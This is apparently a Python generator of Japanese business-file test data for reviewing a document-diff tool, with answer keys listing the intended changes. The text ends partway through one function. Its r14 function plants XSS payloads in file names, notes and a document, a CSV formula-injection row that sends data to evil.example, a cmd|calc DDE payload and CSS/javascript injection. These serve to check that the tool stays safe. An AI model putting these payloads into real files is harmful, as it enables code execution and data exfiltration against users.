#!/usr/bin/env python3
"""2回目の20人レビュー用のテストデータ（1回目の samples/ とは別の新しい内容）。
出力：review2/<Rnn_部署_役割>/ に業務ファイルと「正解.md」（用意した変更点の一覧）"""
import os, sys, random, shutil, asyncio, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import gen_samples as G
from PIL import Image, ImageDraw, ImageFilter

ROOT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'review2')
G.ROOT = ROOT
random.seed(2027)
P, text, mkdocx, mkxlsx, mkpptx, chrome_pdf, html_doc, font, page_image, scan_pdf = G.P, G.text, G.mkdocx, G.mkxlsx, G.mkpptx, G.chrome_pdf, G.html_doc, G.font, G.page_image, G.scan_pdf
KEYS = {}


def key(d, *lines):
    KEYS.setdefault(d, []).extend(lines)


def pages_html(title, pages):
    """複数ページのPDF用HTML。pages: [[段落, …], …]（'## ' は見出し、('table', rows) は表）"""
    out = []
    for i, pg in enumerate(pages):
        body = (f'<h1>{title}</h1>' if i == 0 else '')
        for x in pg:
            if isinstance(x, tuple): body += '<table>' + ''.join('<tr>' + ''.join(f'<td>{c}</td>' for c in r) + '</tr>' for r in x[1]) + '</table>'
            elif x.startswith('## '): body += f'<h2>{x[3:]}</h2>'
            else: body += f'<p>{x}</p>'
        out.append(f'<div class="{"pb" if i else ""}">{body}<p style="position:absolute;margin-top:20px;color:#888;font-size:9pt">- {i + 1} -</p></div>')
    return html_doc(''.join(out))


def big_drawing(path, rev, sheet, parts, size=(4967, 3508), rot=0.0, offset=(0, 0), scan=False, fmt=None, extra=None):
    """A1 相当（150dpi）の図面。parts: [(x, y, w, h, 寸法文字)]"""
    W, H = size; im = Image.new('RGB', (W, H), 'white'); d = ImageDraw.Draw(im); ox, oy = offset
    d.rectangle([50 + ox, 50 + oy, W - 50 + ox, H - 50 + oy], outline='black', width=6)
    for k in range(1, 8): d.line([50 + ox + k * (W - 100) // 8, 50 + oy, 50 + ox + k * (W - 100) // 8, 80 + oy], fill='black', width=2)
    tb = [W - 1300 + ox, H - 420 + oy, W - 50 + ox, H - 50 + oy]
    d.rectangle(tb, outline='black', width=5)
    for k in range(1, 4): d.line([tb[0], tb[1] + k * 92, tb[2], tb[1] + k * 92], fill='black', width=3)
    d.text((tb[0] + 30, tb[1] + 18), f'図番 PL-3307-{sheet}  改訂 {rev}', fill='black', font=font(52, True))
    d.text((tb[0] + 30, tb[1] + 110), '件名 第3ライン 搬送架台', fill='black', font=font(48))
    d.text((tb[0] + 30, tb[1] + 202), f'シート {sheet}　尺度 1:10', fill='black', font=font(48))
    d.text((tb[0] + 30, tb[1] + 294), '設計 佐々木　検図 森', fill='black', font=font(48))
    for (x, y, w, h, lab) in parts:
        x += ox; y += oy
        d.rectangle([x, y, x + w, y + h], outline='black', width=6)
        d.line([x, y - 80, x + w, y - 80], fill='black', width=3)
        d.text((x + w / 2 - 60, y - 150), lab, fill='black', font=font(56))
        for k in range(1, 6): d.line([x + k * w // 6, y, x + k * w // 6, y + h], fill='black', width=2)
    d.text((120 + ox, 130 + oy), '注記：溶接は全周すみ肉 4mm。塗装 マンセル 5Y7/1', fill='black', font=font(46))
    if extra: d.text((120 + ox, 200 + oy), extra, fill='black', font=font(46))
    if rot: im = im.rotate(rot, resample=Image.BICUBIC, fillcolor='white')
    if scan:
        im = im.filter(ImageFilter.GaussianBlur(0.9)).convert('L').convert('RGB'); px = im.load()
        for _ in range(30000):
            x, y = random.randrange(W), random.randrange(H); v = random.randint(140, 210); px[x, y] = (v, v, v)
    im.save(P(path), format=fmt, resolution=150)
    return im


# ------------------------------------------------------------------------------------------
def r01(d):
    a = ['第1条（目的）', '本契約は、甲乙間の共同開発の検討のために開示される秘密情報の取扱いを定める。', '第2条（秘密情報）', '秘密情報とは、開示の際に秘密である旨を明示した技術上・営業上の情報をいう。',
         '第3条（秘密保持義務）', '受領者は、秘密情報を善良な管理者の注意をもって管理し、第三者に開示しない。', '第4条（目的外使用の禁止）', '受領者は、秘密情報を本目的以外に使用しない。',
         '第5条（返還）', '受領者は、開示者の請求があったときは、速やかに秘密情報を返還する。', '第6条（有効期間）', '本契約の有効期間は締結日から2年間とする。', '第7条（管轄）', '本契約に関する紛争は、東京地方裁判所を第一審の専属的合意管轄裁判所とする。']
    b = list(a)
    b[3] = '秘密情報とは、開示の際に秘密である旨を明示した技術上・営業上の情報、及び口頭で開示され30日以内に書面で特定された情報をいう。'
    b[9] = '受領者は、開示者の請求があったときは、速やかに秘密情報を返還又は廃棄し、その旨を書面で通知する。'
    b[11] = '本契約の有効期間は締結日から3年間とし、第3条の義務は終了後2年間存続する。'
    b[13] = '本契約に関する紛争は、大阪地方裁判所を第一審の専属的合意管轄裁判所とする。'
    b2 = b[:8] + ['第4条の2（再委託先への開示）', '受領者は、事前に開示者の書面による承諾を得た場合に限り、再委託先に秘密情報を開示できる。'] + b[8:]
    mkdocx(f'{d}/秘密保持契約書_当社ひな形.docx', '秘密保持契約書', a)
    mkdocx(f'{d}/秘密保持契約書_先方赤入れ反映.docx', '秘密保持契約書', b2)
    chrome_pdf(f'{d}/秘密保持契約書_先方返送.pdf', pages_html('秘密保持契約書', [b2[:6], b2[6:12], b2[12:] + ['（以下余白）']]))
    key(d, '第2条：口頭開示の情報を追加', '第4条の2（再委託先への開示）を新設', '第5条：返還→返還又は廃棄、書面で通知', '第6条：2年間→3年間、存続条項を追加', '第7条：東京地方裁判所→大阪地方裁判所',
        'Word（当社ひな形）とPDF（先方返送）を比べても同じ変更が出ること')


def r02(d):
    a = [['## 第1章 総則', '第1条 この規程は、役職員の出張に関する旅費の支給基準を定める。', '第2条 出張とは、業務のため勤務地を離れることをいう。'],
         ['## 第2章 国内出張', '第5条 日当は1日につき2,000円とする。', '第6条 宿泊料は1泊につき10,000円を上限とする。', '第7条 交通費は最も経済的な経路の実費とする。'],
         ['## 第3章 海外出張', '第10条 日当は1日につき5,000円とする。', '第11条 宿泊料は実費とし、1泊30,000円を上限とする。'],
         ['## 附則', 'この規程は2025年4月1日から施行する。']]
    b = [a[0], ['## 第2章 国内出張', '第5条 日当は1日につき2,500円とする。', '第6条 宿泊料は1泊につき12,000円を上限とする。ただし東京23区内は14,000円とする。', '第7条 交通費は最も経済的な経路の実費とする。'],
         ['## 第2章の2 オンライン会議の推奨', '第8条の2 出張の前に、オンライン会議で代替できないかを検討する。', '第8条の3 代替できる場合は、出張を承認しない。'],
         a[2], ['## 附則', 'この規程は2025年4月1日から施行する。', '改定：2027年4月1日（日当・宿泊料の見直し、第2章の2の新設）']]
    chrome_pdf(f'{d}/旅費規程_2025.pdf', pages_html('旅費規程', a))
    chrome_pdf(f'{d}/旅費規程_2027改定案.pdf', pages_html('旅費規程', b))
    mkdocx(f'{d}/旅費規程_新旧対照の元原稿_2025.docx', '旅費規程', sum(a, []))
    mkdocx(f'{d}/旅費規程_新旧対照の元原稿_2027.docx', '旅費規程', sum(b, []))
    key(d, 'PDFは4ページ→5ページ。3ページ目（第2章の2）が挿入', '第5条 日当 2,000円→2,500円', '第6条 宿泊料 10,000円→12,000円、東京23区内14,000円を追加', '附則に改定日を追加',
        '重ね合わせ：ページの対応付けで3ページ目が「右で追加」となること')


def r03(d):
    hdr = ['精算番号', '社員', '部署', '日付', '科目', '金額', '承認']
    rows = [[f'EX-{i:05d}', n, dp, f'2026/11/{(i * 3) % 28 + 1:02d}', k, amt, '済'] for i, (n, dp, k, amt) in enumerate([
        ('青木', '営業1課', '旅費交通費', 12800), ('石田', '営業2課', '接待交際費', 45600), ('上田', '開発課', '消耗品費', 3980), ('江口', '総務課', '通信費', 7700),
        ('大野', '営業1課', '旅費交通費', 28600), ('加藤', '開発課', '研修費', 55000), ('木村', '経理課', '会議費', 6400), ('久保', '営業2課', '旅費交通費', 19840)], 1)]
    rows2 = [list(r) for r in rows]
    rows2[1][5] = 46500; rows2[5][6] = '差戻し'; rows2[6][4] = '福利厚生費'; del rows2[3]
    rows2.append(['EX-00009', '小林', '開発課', '2026/11/29', '旅費交通費', 15200, '済'])
    mkxlsx(f'{d}/経費精算一覧_11月_一次.xlsx', {'精算': [hdr] + rows, '部署別': [['部署', '金額'], ['営業1課', 41400], ['営業2課', 65440], ['開発課', 58980], ['総務課', 7700], ['経理課', 6400]]})
    mkxlsx(f'{d}/経費精算一覧_11月_確定.xlsx', {'精算': [hdr] + rows2, '部署別': [['部署', '金額'], ['営業1課', 41400], ['営業2課', 66340], ['開発課', 74180], ['経理課', 6400]]})
    pay = lambda total, day: html_doc(f'<h1>お支払い通知書</h1><p>株式会社オメガ 御中</p><table><tr><th>請求番号</th><th>金額</th></tr><tr><td>INV-7781</td><td>{total:,}円</td></tr></table><p>お支払日：{day}</p><p>振込手数料は当社負担といたします。</p>')
    chrome_pdf(f'{d}/支払通知書_オメガ_当初.pdf', pay(1_284_000, '2026年12月25日'))
    chrome_pdf(f'{d}/支払通知書_オメガ_訂正.pdf', pay(1_248_000, '2026年12月25日'))
    key(d, 'EX-00002 金額 45,600→46,500', 'EX-00004（江口）の行を削除', 'EX-00006 承認 済→差戻し', 'EX-00007 科目 会議費→福利厚生費', 'EX-00009 を追加', '部署別シート：総務課の行がなくなり、営業2課・開発課の金額が変わる',
        '支払通知書：1,284,000円→1,248,000円（桁の入れ替わり）')


def r04(d):
    hdr = '品番,品名,単価,最小発注数,リードタイム(日)\n'
    items = [('BR-1001', 'ベアリング 6204ZZ', 380, 10, 7), ('BR-1002', 'ベアリング 6205ZZ', 450, 10, 7), ('BL-2210', '六角ボルト M10x40', 22, 100, 3), ('NT-2210', '六角ナット M10', 8, 100, 3),
             ('OR-0330', 'Oリング P30', 65, 50, 14), ('SP-7001', '圧縮ばね φ12', 140, 20, 21)]
    items2 = [list(x) for x in items]; items2[0][2] = 410; items2[4][4] = 21; items2.insert(3, ['BL-2212', '六角ボルト M10x50', 25, 100, 3])
    text(f'{d}/単価表_2026上期.csv', hdr + ''.join(','.join(map(str, x)) + '\n' for x in items), 'shift_jis', '\r\n')
    text(f'{d}/単価表_2026下期.csv', hdr + ''.join(','.join(map(str, x)) + '\n' for x in items2), 'shift_jis', '\r\n')
    po = lambda qty, day: [f'発注番号 PO-26-0815', '発注先 株式会社ゼニス精工', '## 発注明細', f'ベアリング 6204ZZ　数量 {qty}　単価 380円', '六角ボルト M10x40　数量 500　単価 22円', f'納期 {day}', '納入場所 本社工場 資材倉庫']
    scan_pdf(f'{d}/注文書_控え_スキャン.pdf', [page_image(po(200, '2026年12月10日'), '注文書', stamp='購買')])
    scan_pdf(f'{d}/注文請書_返送スキャン.pdf', [page_image(po(200, '2026年12月17日'), '注文書', offset=(12, -9), rot=0.6, stamp='受領')])
    key(d, '単価表：BR-1001 単価 380→410、OR-0330 リードタイム 14→21、BL-2212 を追加', '注文書と請書（スキャン、傾き0.6°）：納期 12月10日→12月17日、印影「購買」→「受領」')


def r05(d):
    a = ['## 1. 不適合の内容', 'ロット L-2611-07 の外径寸法が規格上限を超えた（φ20.07）。', '## 2. 原因', '切削工具の摩耗の管理が不十分だった。', '## 3. 処置', '当該ロットを全数選別した。',
         '## 4. 再発防止策', '工具の交換周期を500個から400個に見直す。', '## 5. 効果の確認', '3か月間の工程内不良率で確認する。']
    b = list(a); b[3] = '切削工具の摩耗の管理が不十分だった。また、工程内検査の頻度が不足していた。'; b[7] = '工具の交換周期を500個から350個に見直し、工程内検査を1時間ごとから30分ごとにする。'
    b[9] = '3か月間の工程内不良率（目標 0.1%以下）で確認する。'
    mkdocx(f'{d}/是正処置報告書_CAR-2611_初版.docx', '是正処置報告書 CAR-2611', a)
    mkdocx(f'{d}/是正処置報告書_CAR-2611_承認版.docx', '是正処置報告書 CAR-2611', b)
    cal = lambda v: [['## 校正記録', '計測器 マイクロメータ MM-014', f'基準値 25.000mm　測定値 {v[0]}', f'判定 {v[1]}'], ['## 校正記録（2）', '計測器 ノギス NG-022', '基準値 50.00mm　測定値 50.01', '判定 合格']]
    scan_pdf(f'{d}/校正記録_2026年10月.pdf', [page_image(x, '計測器 校正記録', stamp='品証') for x in cal(('25.002', '合格'))])
    scan_pdf(f'{d}/校正記録_2026年10月_再校正後.pdf', [page_image(x, '計測器 校正記録', offset=(-6, 5), rot=-0.25, stamp='品証') for x in cal(('25.006', '不合格→調整後合格'))])
    key(d, '原因・再発防止策・効果の確認の3か所を変更（400個→350個、30分ごと、目標0.1%以下）', '校正記録（2ページのスキャン）：1ページ目の測定値 25.002→25.006、判定の変更。2ページ目は変更なし')


def r06(d):
    s1 = [(400, 700, 1500, 500, '2400'), (2200, 700, 900, 500, '1200')]
    s2 = [(400, 600, 2600, 300, '3600'), (400, 1300, 800, 900, '800')]
    s3 = [(500, 800, 1200, 1200, '1500')]
    big_drawing(f'{d}/_1C.png', 'C', '1', s1); big_drawing(f'{d}/_2C.png', 'C', '2', s2)
    big_drawing(f'{d}/_1D.png', 'D', '1', [(400, 700, 1500, 500, '2400'), (2200, 700, 900, 500, '1250')], extra='※脚長さ変更 1200→1250')
    big_drawing(f'{d}/_2D.png', 'D', '2', s2); big_drawing(f'{d}/_3D.png', 'D', '3', s3, extra='※シート3（補強材）を追加')
    ims = lambda names: [Image.open(P(f'{d}/{n}')).convert('RGB') for n in names]
    c, dd = ims(['_1C.png', '_2C.png']), ims(['_1D.png', '_3D.png', '_2D.png'])
    c[0].save(P(f'{d}/PL-3307_RevC_A1.pdf'), save_all=True, append_images=c[1:], resolution=150)
    dd[0].save(P(f'{d}/PL-3307_RevD_A1.pdf'), save_all=True, append_images=dd[1:], resolution=150)
    for n in ['_1C.png', '_2C.png', '_1D.png', '_2D.png', '_3D.png']: os.remove(P(f'{d}/{n}'))
    big_drawing(f'{d}/PL-3307-1_RevD_現場戻りスキャン.jpg', 'D', '1', [(400, 700, 1500, 500, '2400'), (2200, 700, 900, 500, '1250')], extra='※脚長さ変更 1200→1250', rot=0.5, offset=(14, -10), scan=True, fmt='JPEG')
    key(d, 'A1（4967×3508px）。RevC 2シート→RevD 3シート。RevD の2ページ目にシート3が挿入（並びは 1,3,2）', 'シート1：寸法 1200→1250、注記を追加', 'シート2：変更なし', '現場戻りスキャン（0.5°傾き・ノイズあり）と RevD シート1 は同じ内容（差異なしが正解）')


def r07(d):
    a = '''import os
import json


def load_config(path):
    with open(path, encoding="utf-8") as f:
        return json.load(f)


def connect(cfg):
    host = cfg.get("host", "localhost")
    port = cfg.get("port", 5432)
    return f"postgresql://{host}:{port}/app"


def main():
    cfg = load_config(os.environ.get("APP_CONFIG", "config.json"))
    print(connect(cfg))


if __name__ == "__main__":
    main()
'''
    b = a.replace('    port = cfg.get("port", 5432)\n', '    port = int(cfg.get("port", 5432))\n    user = cfg["user"]\n').replace('return f"postgresql://{host}:{port}/app"', 'return f"postgresql://{user}@{host}:{port}/app"').replace('import json\n', 'import json\nimport logging\n')
    text(f'{d}/db_util_old.py', a, eol='\r\n'); text(f'{d}/db_util_new.py', b.rstrip('\n'), eol='\r\n')
    ya = 'server:\n  port: 8080\n  workers: 4\nlogging:\n  level: info\n'
    yb = 'server:\n  port: 8443\n  workers: 4\n  tls: true\nlogging:\n  level: warn\n'
    text(f'{d}/app_old.yaml', ya); text(f'{d}/app_new.yaml', yb)
    key(d, 'Python（CRLF）：import logging 追加、port を int()、user を追加、接続文字列に user@、新版は末尾の改行なし', 'YAML：port 8080→8443、tls 追加、level info→warn', 'パッチを出力して git apply で当たること')


def r08(d):
    base = {'nginx/nginx.conf': 'worker_processes auto;\nevents { worker_connections 1024; }\n', 'nginx/conf.d/app.conf': 'server {\n  listen 80;\n  server_name app.example.local;\n}\n',
            'app/setting.ini': '[db]\nhost=db01\nuser=app\n; 本番用設定\n', 'app/readme.txt': 'アプリ設定の説明\n', 'cron/backup.sh': '#!/bin/sh\ntar czf /backup/app.tgz /srv/app\n'}
    new = dict(base); new['nginx/conf.d/app.conf'] = 'server {\n  listen 443 ssl;\n  server_name app.example.local;\n  ssl_certificate /etc/ssl/app.crt;\n}\n'
    new['app/setting.ini'] = '[db]\nhost=db02\nuser=app\n; 本番用設定\n'; del new['cron/backup.sh']; new['cron/backup_daily.sh'] = '#!/bin/sh\ntar czf /backup/app_$(date +%F).tgz /srv/app\n'
    for root, files in [('設定_本番_変更前', base), ('設定_本番_変更後', new)]:
        for p, s in files.items():
            enc = 'shift_jis' if p.endswith('.ini') or p.endswith('.txt') else 'utf-8'
            eol = '\r\n' if p.endswith('.ini') else '\n'
            text(f'{d}/{root}/{p}', s, enc, eol)
    text(f'{d}/設定_本番_変更後/app/readme.txt', 'アプリ設定の説明\n', 'utf-8', '\n')
    key(d, 'フォルダ比較：app.conf（443 ssl）、setting.ini（db01→db02、Shift_JIS・CRLF）、backup.sh 左のみ、backup_daily.sh 右のみ',
        'readme.txt は文字コードだけ違う（Shift_JIS→UTF-8）。内容は同じ')


def r09(d):
    text(f'{d}/空.txt', ''); text(f'{d}/改行だけ.txt', '\n\n\n')
    random.seed(9)
    lines = [f'2026-11-{(i // 4000) + 1:02d}T{(i // 60) % 24:02d}:{i % 60:02d}:00 INFO req id={i:06d} status=200 ms={random.randint(3, 400)}' for i in range(80000)]
    lines2 = list(lines); lines2[41234] = lines2[41234].replace('status=200', 'status=500'); lines2.insert(60000, '2026-11-15T23:59:59 WARN slow query detected')
    text(f'{d}/access_8万行.log', '\n'.join(lines) + '\n'); text(f'{d}/access_8万行_障害後.log', '\n'.join(lines2) + '\n')
    pg = [[f'第{i + 1}節 テスト項目 {i + 1}', 'この節では入力値の境界を確認する。' * 3] for i in range(120)]
    pg2 = [list(x) for x in pg]; pg2[87][1] = 'この節では入力値の境界と異常値を確認する。' * 3
    chrome_pdf(f'{d}/試験仕様書_120ページ.pdf', pages_html('試験仕様書', pg)); chrome_pdf(f'{d}/試験仕様書_120ページ_改.pdf', pages_html('試験仕様書', pg2))
    Image.new('RGB', (400, 300), 'white').save(P(f'{d}/偽装_実はPNG.pdf'), format='PNG')
    key(d, 'ログ8万行：41235行目 status 200→500、60001行目に WARN を挿入', 'PDF 120ページ：88ページ目の1文だけ変更', '空ファイル・改行だけのファイル、拡張子が .pdf の PNG')


def r10(d):
    s1 = [('2027年度 ご提案', ['株式会社ノース様', '営業部 第1課']), ('課題', ['在庫の見える化', '発注の属人化']), ('ご提案内容', ['クラウド在庫管理の導入', '発注点の自動計算']),
          ('お見積', ['初期費用 1,800,000円', '月額 120,000円']), ('スケジュール', ['2027年4月 要件定義', '2027年7月 稼働'])]
    s2 = [s1[0], s1[1], ('ご提案内容', ['クラウド在庫管理の導入', '発注点の自動計算', 'ハンディ端末によるバーコード入出庫']), ('導入事例', ['A社：在庫回転率 1.4倍', 'B社：欠品 60%削減']),
          ('お見積', ['初期費用 1,650,000円', '月額 120,000円（端末10台を含む）']), ('スケジュール', ['2027年4月 要件定義', '2027年8月 稼働'])]
    mkpptx(f'{d}/ノース様提案_v3.pptx', s1, ['', '', '', '値引きは課長判断', '']); mkpptx(f'{d}/ノース様提案_v4_提出版.pptx', s2, ['', '', '', '', '値引き 150,000円 部長承認済み', ''])
    q = lambda init, mon: html_doc(f'<h1>御見積書</h1><p>株式会社ノース 御中</p><table><tr><th>項目</th><th>金額</th></tr><tr><td>初期費用</td><td>{init}</td></tr><tr><td>月額利用料</td><td>{mon}</td></tr></table><p>有効期限：発行日より30日</p>')
    chrome_pdf(f'{d}/御見積書_v3.pdf', q('1,800,000円', '120,000円')); chrome_pdf(f'{d}/御見積書_v4.pdf', q('1,650,000円', '120,000円'))
    key(d, 'PowerPoint：ご提案内容に1行追加、「導入事例」スライドを新設、初期費用 1,800,000→1,650,000、稼働 7月→8月、ノートの変更', '見積PDF：初期費用 1,800,000円→1,650,000円')


def r11(d):
    hdr = '社員番号,氏名,所属,等級,基本給\n'
    emp = [('10021', '佐藤 花子', '総務課', 'G3', 285000), ('10022', '鈴木 一郎', '営業1課', 'G4', 312000), ('10035', '高橋 誠', '開発課', 'G2', 248000), ('10040', '田中 美咲', '経理課', 'G3', 279000), ('10051', '伊藤 健', '営業2課', 'G5', 356000)]
    emp2 = [list(x) for x in emp]; emp2[1][3] = 'G5'; emp2[1][4] = 338000; emp2[2][2] = '開発2課'; emp2[3][1] = '山田 美咲'; emp2.append(['10063', '中村 翔', '開発課', 'G1', 225000])
    text(f'{d}/給与マスタ_2026年3月.csv', hdr + ''.join(','.join(map(str, x)) + '\n' for x in emp), 'shift_jis', '\r\n')
    text(f'{d}/給与マスタ_2026年4月.csv', hdr + ''.join(','.join(map(str, x)) + '\n' for x in emp2), 'shift_jis', '\r\n')
    mkxlsx(f'{d}/昇給シミュレーション_案1.xlsx', {'案1': [['等級', '昇給率', '平均基本給'], ['G1', 0.03, 225000], ['G2', 0.03, 248000], ['G3', 0.025, 282000], ['G4', 0.02, 312000]]})
    mkxlsx(f'{d}/昇給シミュレーション_案2.xlsx', {'案1': [['等級', '昇給率', '平均基本給'], ['G1', 0.035, 225000], ['G2', 0.03, 248000], ['G3', 0.03, 282000], ['G4', 0.02, 312000]]})
    key(d, '給与マスタ：10022 昇格 G4→G5・338,000、10035 所属変更、10040 改姓（田中→山田）、10063 追加', '昇給シミュレーション：G1 0.03→0.035、G3 0.025→0.03')


def r12(d):
    pages = [['## 1. 経営方針', '「つくる力」と「つなぐ力」で、持続的な成長を実現する。'], ['## 2. 数値目標', '売上高 2029年度 1,200億円', '営業利益率 8.0%', 'ROE 10%以上'],
             ['## 3. 事業別戦略', '産業機器：海外売上比率を40%へ', '医療機器：新製品3機種を投入'], ['## 4. 投資計画', '設備投資 3年間で180億円', 'DX投資 3年間で30億円'],
             ['## 5. 人材戦略', '女性管理職比率 15%', 'エンゲージメントスコア 70以上'], ['## 6. 株主還元', '配当性向 30%以上'], ['## 7. リスク', '為替・原材料価格の変動'], ['## 8. 付録', '用語集']]
    p2 = [list(x) for x in pages]; p2[1][1] = '売上高 2029年度 1,250億円'; p2[3][1] = '設備投資 3年間で200億円'; del p2[6]
    chrome_pdf(f'{d}/中期経営計画_取締役会_事前配布.pdf', pages_html('中期経営計画 2027-2029', pages))
    chrome_pdf(f'{d}/中期経営計画_取締役会_当日版.pdf', pages_html('中期経営計画 2027-2029', p2))
    key(d, '8ページ→7ページ。7ページ目（リスク）を削除', '売上高 1,200億円→1,250億円', '設備投資 180億円→200億円', '重ね合わせ：「左から削除」の表示と、それ以降のページの対応')


def r13(d):
    a = '''# セットアップガイド

## 1. はじめに
本書では、ShibaHub の初期設定の手順を説明します。

## 2. インストール
1. インストーラをダウンロードします。
2. インストーラを実行し、画面の指示に従います。
3. 再起動します。

## 3. 初期設定
- 管理者アカウントを作成してください。
- メールサーバの設定を行ってください。
- バックアップ先を指定してください。

## 4. トラブルシューティング
接続できない場合は、ファイアウォールの設定を確認してください。
'''
    b = a.replace('ShibaHub の初期設定', 'ShibaHub（バージョン 3.2）の初期設定').replace('3. 再起動します。', '3. コンピューターを再起動します。').replace('メールサーバの設定', 'メールサーバーの設定').replace('を行ってください。', 'をしてください。').replace('ファイアウォール', 'ファイヤーウォール')
    text(f'{d}/setup_guide_ja_v1.md', a); text(f'{d}/setup_guide_ja_v2.md', b)
    en = ['1. Download the installer.', '2. Run the installer and follow the instructions.', '3. Restart.']
    en2 = ['1. Download the installer.', '2. Run the installer and follow the on-screen instructions.', '3. Restart your computer.']
    mkdocx(f'{d}/対訳_インストール手順_v1.docx', '対訳：インストール', [('table', [['英語', '日本語']] + [[e, j] for e, j in zip(en, ['1. インストーラをダウンロードします。', '2. インストーラを実行し、画面の指示に従います。', '3. 再起動します。'])])])
    mkdocx(f'{d}/対訳_インストール手順_v2.docx', '対訳：インストール', [('table', [['英語', '日本語']] + [[e, j] for e, j in zip(en2, ['1. インストーラをダウンロードします。', '2. インストーラを実行し、画面の指示に従います。', '3. コンピューターを再起動します。'])])])
    key(d, 'Markdown：バージョン追記、「再起動」→「コンピューターを再起動」、サーバ→サーバー、行って→して、ファイアウォール→ファイヤーウォール（表記ゆれの改悪）', '対訳Word：英語2行・日本語1行の変更')


def r14(d):
    text(f'{d}/<img src=x onerror=alert(1)>.txt', '通常のテキスト\n<script>alert("xss")</script>\n')
    text(f'{d}/普通のテキスト.txt', '通常のテキスト\n本文\n')
    text(f'{d}/取引先一覧_数式注入.csv', '会社名,電話\n株式会社A,03-0000-0000\n=HYPERLINK("http://evil.example/?"&A2,"詳細"),03-1111-1111\n@SUM(1+1)*cmd|\'/C calc\'!A0,000\n', 'utf-8')
    text(f'{d}/取引先一覧_正常.csv', '会社名,電話\n株式会社A,03-0000-0000\n株式会社B,03-1111-1111\n', 'utf-8')
    ann = {'app': 'shibadiff', 'version': 1, 'files': [{'side': 0, 'name': '普通のテキスト.txt', 'size': len('通常のテキスト\n本文\n'.encode()), 'rot': 0, 'annotations': {'0': [{'t': 'note', 'x': 50, 'y': 50, 'text': '<img src=x onerror=alert(2)>', 'bg': 'red;background:url(http://evil.example)'},
                                                                                         {'t': 'rect', 'x': '1);fill:url(javascript:alert(3)', 'y': 10, 'w': 10, 'h': 10, 'c': '#f00"/><script>alert(4)</script>'}]}}]}
    open(P(f'{d}/細工した注釈.json'), 'w', encoding='utf-8').write(json.dumps(ann, ensure_ascii=False))
    mkdocx(f'{d}/社外秘_事業計画.docx', '社外秘 事業計画', ['新製品のコード名は「ORCA」。', '発売は2027年10月を予定。'])
    mkdocx(f'{d}/社外秘_事業計画_改.docx', '社外秘 事業計画', ['新製品のコード名は「ORCA」。', '発売は2028年1月を予定。', '<script>fetch("http://evil.example")</script>'])
    key(d, 'ファイル名・本文・CSV・注釈JSONの細工で、スクリプトが動かないこと・外部へ通信しないこと', 'レポート（HTML）を開いても同様', '事業計画：発売 2027年10月→2028年1月、スクリプト風の行を追加')


def r15(d):
    pg = lambda t: [['## 起案', f'件名 {t}', '起案日 令和8年11月10日', '起案者 総務課 主事 山口'], ['## 決裁欄', '課長　部長　副市長'], ['## 本文', '標記について、別紙のとおり実施してよろしいか伺います。']]
    a = pg('市民窓口のキャッシュレス決済の導入について')
    b = [a[0], ['## 決裁欄', '課長　部長　副市長　市長'], ['## 合議', '会計課長　情報政策課長'], a[2]]
    scan_pdf(f'{d}/決裁文書_起案時_スキャン.pdf', [page_image(x, '起案用紙', stamp='総務') for x in a])
    scan_pdf(f'{d}/決裁文書_決裁後_スキャン.pdf', [page_image(x, '起案用紙', offset=(8, -5), rot=0.4, stamp=('総務' if i != 1 else '決裁')) for i, x in enumerate(b)])
    mkdocx(f'{d}/起案文_下書き.docx', '市民窓口のキャッシュレス決済の導入について', ['1 目的', '窓口での現金の取扱いを減らし、市民の利便性を高める。', '2 実施時期', '令和9年4月1日'])
    mkdocx(f'{d}/起案文_修正後.docx', '市民窓口のキャッシュレス決済の導入について', ['1 目的', '窓口での現金の取扱いを減らし、市民の利便性と事務の効率を高める。', '2 実施時期', '令和9年7月1日', '3 対象窓口', '市民課、税務課、保険年金課'])
    key(d, 'スキャン（傾き0.4°）：3ページ→4ページ。3ページ目（合議）が挿入、2ページ目の決裁欄に「市長」、印影が「決裁」に', '起案文：目的に追記、実施時期 4月1日→7月1日、対象窓口を追加')


def r16(d):
    p = [['Abstract', 'We report a low-temperature synthesis of TiO<sub>2</sub> thin films with 92% transmittance.'], ['1. Introduction', 'Titanium dioxide is widely used as a photocatalyst [1].'],
         ['2. Methods', 'Films were annealed at 350 °C for 2 h in air.', 'Thickness was measured by ellipsometry (n = 5).'], ['3. Results', 'The band gap was 3.21 ± 0.02 eV.', 'Table 1 shows the transmittance at 550 nm.']]
    p2 = [list(x) for x in p]; p2[0][1] = 'We report a low-temperature synthesis of TiO<sub>2</sub> thin films with 94% transmittance.'; p2[2][1] = 'Films were annealed at 300 °C for 3 h in air.'; p2[3][1] = 'The band gap was 3.19 ± 0.03 eV.'
    chrome_pdf(f'{d}/manuscript_v2.pdf', pages_html('Low-temperature TiO2 films', p)); chrome_pdf(f'{d}/manuscript_v3_coauthor.pdf', pages_html('Low-temperature TiO2 films', p2))
    hdr = 'sample,temp_C,thickness_nm,transmittance\n'
    rows = [(f'S{i:02d}', 300 + (i % 3) * 25, 120 + i * 3, round(0.88 + i * 0.004, 3)) for i in range(1, 16)]
    rows2 = [list(r) for r in rows]; rows2[6][3] = 0.925; rows2[11][2] = 160
    text(f'{d}/measurements_run1.csv', hdr + ''.join(','.join(map(str, r)) + '\n' for r in rows)); text(f'{d}/measurements_run1_corrected.csv', hdr + ''.join(','.join(map(str, r)) + '\n' for r in rows2))
    key(d, '論文：透過率 92%→94%、アニール 350 °C 2 h→300 °C 3 h、バンドギャップ 3.21 ± 0.02→3.19 ± 0.03', 'CSV：S07 transmittance 0.908→0.925、S12 thickness 156→160')


def r17(d):
    parts = [(400, 900, 3000, 700, '基礎 W=1200'), (400, 1900, 1400, 900, 'ピット 1800×1500')]
    big_drawing(f'{d}/施工図_基礎_第4回.jpg', '4', 'K1', parts, fmt='JPEG')
    big_drawing(f'{d}/施工図_基礎_第5回_現場スキャン.jpg', '5', 'K1', [(400, 900, 3000, 700, '基礎 W=1200'), (400, 1900, 1600, 900, 'ピット 2000×1500')], rot=-0.7, offset=(-20, 16), scan=True, fmt='JPEG', extra='※ピット拡大（設備変更による）')
    sch = [['工種', '開始', '終了', '担当'], ['掘削', '2026/12/01', '2026/12/05', '山本組'], ['捨てコン', '2026/12/07', '2026/12/07', '山本組'], ['配筋', '2026/12/08', '2026/12/14', '鉄筋 田村'], ['型枠', '2026/12/10', '2026/12/16', '型枠 小島']]
